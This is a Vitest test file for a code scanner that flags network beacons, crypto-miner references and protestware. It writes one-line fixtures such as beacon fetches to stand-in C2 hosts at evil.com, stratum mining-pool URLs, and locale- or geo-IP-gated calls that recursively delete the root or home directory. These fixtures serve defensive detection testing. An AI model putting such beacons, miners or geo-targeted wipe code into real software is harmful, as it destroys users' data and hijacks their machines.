import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { performanceBudget } from "./performance-budget.js";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";

describe("Network Beacon and Crypto Miner Detection (T-008)", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-beacon-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  // ── Beacon detection ────────────────────────────────────────────

  describe("Beacon detection", () => {
    it("should detect setInterval + fetch beacon pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        `setInterval(function() { fetch("https://c2.evil.com/heartbeat"); }, 30000);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BEACON_INTERVAL_FETCH",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("medium");
    });

    it("should detect setInterval + https.get beacon pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon2.js"),
        `setInterval(() => { https.get("https://evil.com/ping"); }, 60000);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BEACON_INTERVAL_FETCH",
      );
      expect(finding).toBeDefined();
    });

    it("should detect setTimeout + fetch pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "delayed.js"),
        `setTimeout(function() { fetch("https://c2.evil.com/check"); }, 5000);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BEACON_TIMEOUT_FETCH",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("medium");
    });

    it("should detect WebSocket to external host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ws.js"),
        `const ws = new WebSocket("wss://c2.evil.com/stream");`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BEACON_WEBSOCKET_EXTERNAL",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("medium");
    });

    it("should not flag WebSocket to localhost", async () => {
      fs.writeFileSync(
        path.join(tempDir, "local-ws.js"),
        `const ws = new WebSocket("ws://localhost:8080/dev");`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BEACON_WEBSOCKET_EXTERNAL",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Crypto miner detection ──────────────────────────────────────

  describe("Crypto miner detection", () => {
    it("should detect stratum protocol references", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner.js"),
        `const pool = "stratum+tcp://pool.minexmr.com:4444";`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINER_STRATUM_PROTOCOL",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
    });

    it("should detect stratum+ssl protocol", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner-ssl.js"),
        `const pool = "stratum+ssl://eth.2miners.com:12020";`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINER_STRATUM_PROTOCOL",
      );
      expect(finding).toBeDefined();
    });

    it("should detect known mining pool domains", async () => {
      fs.writeFileSync(
        path.join(tempDir, "pool.js"),
        `const endpoint = "https://nanopool.org/api/v1/hashrate";`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINER_POOL_DOMAIN",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
    });

    it("should detect generic pool hostnames in explicit mining context", async () => {
      fs.writeFileSync(
        path.join(tempDir, "pool2.js"),
        `const url = "stratum+tcp://pool.example.com:4444";`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINER_POOL_DOMAIN",
      );
      expect(finding).toBeDefined();
    });

    it("should detect coinhive references", async () => {
      fs.writeFileSync(
        path.join(tempDir, "coinhive.js"),
        `const miner = new CoinHive.Anonymous("site-key");`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINER_LIBRARY_REF",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
    });

    it("should detect xmrig references", async () => {
      fs.writeFileSync(
        path.join(tempDir, "xmrig.js"),
        `const config = { miner: "xmrig", algo: "cryptonight" };`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const xmrig = report.findings.find(
        (f) => f.rule === "MINER_LIBRARY_REF",
      );
      expect(xmrig).toBeDefined();
    });

    it("should detect mining configuration keys", async () => {
      // Note: notFilePattern skips .json — use .js to test mining config detection
      fs.writeFileSync(
        path.join(tempDir, "miner-config.js"),
        `const cfg = {"wallet":"4Abc123xyzabc","pool_address":"pool.minexmr.com:4444","worker":"worker1"};`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINER_CONFIG_KEYS",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("high");
    });
  });

  // ── Protestware detection ───────────────────────────────────────

  describe("Protestware detection", () => {
    it("should detect locale check + destructive code on same line", async () => {
      fs.writeFileSync(
        path.join(tempDir, "protestware.js"),
        `if (locale === "RU") { fs.rmSync("/", { recursive: true }); }`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "PROTESTWARE_LOCALE_DESTRUCT",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
    });

    it("should detect geo-IP + destructive code pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "geo-destruct.js"),
        `const geo = await ipinfo.lookup(ip); if (geo.country === "RU") process.exit(1);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "PROTESTWARE_GEOIP_DESTRUCT",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("critical");
    });

    it("should detect multi-line protestware (locale near destructive)", async () => {
      const code = [
        'const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;',
        'if (tz.includes("Europe/Moscow")) {',
        '  console.log("targeting...");',
        '  fs.rmSync(homedir, { recursive: true, force: true });',
        '}',
      ].join("\n");

      fs.writeFileSync(path.join(tempDir, "multi-protest.js"), code);

      const report = await scan({ target: tempDir, format: "text" });
      // Should find either single-line or multi-line protestware
      const finding = report.findings.find(
        (f) =>
          f.rule === "PROTESTWARE_LOCALE_DESTRUCT" ||
          f.rule === "PROTESTWARE_PROXIMITY",
      );
      expect(finding).toBeDefined();
    });

    it.each([
      [
        "an Intl-derived alias",
        [
          "const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;",
          "const region = tz;",
          'if (region === "Europe/Moscow") {',
          "  fs.rmSync(dataDirectory, { recursive: true, force: true });",
          "}",
        ].join("\n"),
      ],
      [
        "an executable country property",
        [
          "const country = request.geo.country;",
          'if (country === "RU") {',
          "  fs.rmSync(dataDirectory, { recursive: true, force: true });",
          "}",
        ].join("\n"),
      ],
    ])("should retain multi-line protestware through %s", async (_name, code) => {
      fs.writeFileSync(path.join(tempDir, "structured-protest.js"), code);
      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.some((finding) => finding.rule === "PROTESTWARE_PROXIMITY"),
      ).toBe(true);
    });

    it("should not derive locale evidence from quoted comparison data", async () => {
      const code = [
        'const kind = "timezone";',
        'if (kind === "timezone") {',
        "  fs.rmSync(cacheDirectory, { recursive: true, force: true });",
        "}",
      ].join("\n");
      fs.writeFileSync(path.join(tempDir, "quoted-timezone.js"), code);

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find((finding) => finding.rule === "PROTESTWARE_PROXIMITY"),
      ).toBeUndefined();
    });

    it("should not treat locale formatting near cache cleanup as protestware", async () => {
      const code = [
        "const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;",
        "const formatter = new Intl.DateTimeFormat(locale, { timeZone: timezone });",
        "if (cacheExpired === true) {",
        "  fs.rmSync(cacheDirectory, { recursive: true, force: true });",
        "}",
      ].join("\n");

      fs.writeFileSync(path.join(tempDir, "locale-cache.js"), code);
      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find(
          (f) =>
            f.rule === "PROTESTWARE_LOCALE_DESTRUCT" ||
            f.rule === "PROTESTWARE_PROXIMITY",
        ),
      ).toBeUndefined();
    });

    it("should clear locale derivation after an ordinary overwrite", async () => {
      const code = [
        "let region = Intl.DateTimeFormat().resolvedOptions().timeZone;",
        'region = "cache"; if (region === "cache") {',
        "  fs.rmSync(cacheDirectory, { recursive: true, force: true });",
        "}",
      ].join("\n");

      fs.writeFileSync(path.join(tempDir, "overwritten-region.js"), code);
      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find(
          (finding) =>
            finding.rule === "PROTESTWARE_LOCALE_DESTRUCT" ||
            finding.rule === "PROTESTWARE_PROXIMITY",
        ),
      ).toBeUndefined();
    });

    it("should not correlate cleanup after a closed locale gate", async () => {
      const code = [
        "const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;",
        'if (tz.includes("Europe/Moscow")) {',
        '  console.log("regional notice");',
        "}",
        "fs.rmSync(cacheDirectory, { recursive: true, force: true });",
      ].join("\n");

      fs.writeFileSync(path.join(tempDir, "closed-locale-gate.js"), code);
      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find(
          (f) =>
            f.rule === "PROTESTWARE_LOCALE_DESTRUCT" ||
            f.rule === "PROTESTWARE_PROXIMITY",
        ),
      ).toBeUndefined();
    });

    it("bounds multi-line locale-to-destruction distance at 512 characters", async () => {
      const localeSource = "const locale=getUserLocale();";
      const aliasSource = "const region=locale;";
      const gatePrefix = 'if(region==="RU"){';
      const destructive = "fs.rmSync(dataDirectory);}";
      const localeEvidenceEnd =
        localeSource.length +
        1 +
        aliasSource.indexOf("locale") +
        "locale".length;
      const fixedDistance =
        localeSource.length + 1 + aliasSource.length + 1 + gatePrefix.length - localeEvidenceEnd;
      const sourceAt = (distance: number): string =>
        localeSource +
        "\n" +
        aliasSource +
        "\n" +
        " ".repeat(distance - fixedDistance) +
        gatePrefix +
        destructive;

      const atBoundary = path.join(tempDir, "at-boundary");
      const overBoundary = path.join(tempDir, "over-boundary");
      fs.mkdirSync(atBoundary);
      fs.mkdirSync(overBoundary);
      fs.writeFileSync(path.join(atBoundary, "gate.js"), sourceAt(512));
      fs.writeFileSync(path.join(overBoundary, "gate.js"), sourceAt(513));

      const atReport = await scan({ target: atBoundary, format: "text", noHistory: true });
      const overReport = await scan({ target: overBoundary, format: "text", noHistory: true });
      expect(
        atReport.findings.some((finding) => finding.rule === "PROTESTWARE_PROXIMITY"),
      ).toBe(true);
      expect(
        overReport.findings.some((finding) => finding.rule === "PROTESTWARE_PROXIMITY"),
      ).toBe(false);
    });

    it("keeps nested and sequential geo-gate analysis linear on 5 MiB", { timeout: performanceBudget(15_000) }, async () => {
      const size = 5 * 1024 * 1024;
      const sourcePrefix =
        "const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;\n" +
        "x".repeat(400) +
        "tz=tz;";
      const sequentialNearMiss =
        'if(tz==="Europe/Moscow"){noop();}fs.rmSync(cacheDirectory);tz=tz;'
          .repeat(12_000);
      const nearbyNestedSource =
        "\nlet region=Intl.DateTimeFormat().resolvedOptions().timeZone;\n";
      const nestedOpen =
        'region=region;if(region==="Europe/Moscow"){' .repeat(12_000);
      const nestedClose = "}".repeat(12_000);
      const destructive = "fs.rmSync(dataDirectory);";
      const fixedLength =
        sourcePrefix.length +
        sequentialNearMiss.length +
        nearbyNestedSource.length +
        nestedOpen.length +
        destructive.length +
        nestedClose.length;
      const source =
        sourcePrefix +
        sequentialNearMiss +
        "x".repeat(size - fixedLength) +
        nearbyNestedSource +
        nestedOpen +
        destructive +
        nestedClose;
      fs.writeFileSync(path.join(tempDir, "nested-gates.js"), source);

      const started = Date.now();
      const report = await scan({ target: tempDir, format: "text" });
      expect(Date.now() - started).toBeLessThan(performanceBudget(10_000));
      expect(
        report.findings.some((finding) => finding.rule === "PROTESTWARE_PROXIMITY"),
      ).toBe(true);
    });

    it("should not flag legitimate timezone usage without destructive code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "legit-tz.js"),
        `const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\nconsole.log("Your timezone:", tz);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) =>
          f.rule === "PROTESTWARE_LOCALE_DESTRUCT" ||
          f.rule === "PROTESTWARE_PROXIMITY",
      );
      expect(finding).toBeUndefined();
    });

    it("should not correlate distant events on one minified line", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ordinary-bundle.js"),
        `const locale = currentLocale;${"x".repeat(2_922)}fs.rmSync(cacheEntry);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find((f) => f.rule === "PROTESTWARE_LOCALE_DESTRUCT"),
      ).toBeUndefined();
    });
  });

  // ── No false positives ──────────────────────────────────────────

  describe("False positive avoidance", () => {
    it("should not flag normal setTimeout usage without network", async () => {
      fs.writeFileSync(
        path.join(tempDir, "normal.js"),
        `setTimeout(() => console.log("hello"), 1000);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const beacon = report.findings.find(
        (f) => f.rule.startsWith("BEACON_"),
      );
      expect(beacon).toBeUndefined();
    });

    it("should not flag legitimate pool or mining text in comments", async () => {
      // Note: our scanner does match patterns in comments, but this test
      // verifies that normal prose doesn't trigger mining pool detection
      fs.writeFileSync(
        path.join(tempDir, "clean.js"),
        `// This function manages the thread pool\nconst pool = require("generic-pool");\npool.create({ max: 10 });`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      const miner = report.findings.find(
        (f) => f.rule === "MINER_STRATUM_PROTOCOL" || f.rule === "MINER_LIBRARY_REF",
      );
      expect(miner).toBeUndefined();
    });
  });

  // ── Integration with scan command ───────────────────────────────

  describe("Integration", () => {
    it("should include beacon/miner findings in overall risk score", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hidden-miner.js"),
        `const pool = "stratum+tcp://xmr.pool.com:3333";\nconst miner = new CoinHive.Anonymous("key");`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      // Two critical findings = at least 50 points
      expect(report.score).toBeGreaterThanOrEqual(25);
      expect(report.riskLevel).not.toBe("clean");
    });

    it("should generate recommendations for miner findings", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner.js"),
        `const pool = "stratum+tcp://pool.minexmr.com:4444";`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) =>
          r.toLowerCase().includes("miner"),
        ),
      ).toBe(true);
    });

    it("should generate recommendations for beacon findings", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        `setInterval(function() { fetch("https://c2.evil.com/heartbeat"); }, 30000);`,
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) =>
          r.toLowerCase().includes("beacon"),
        ),
      ).toBe(true);
    });
  });
});
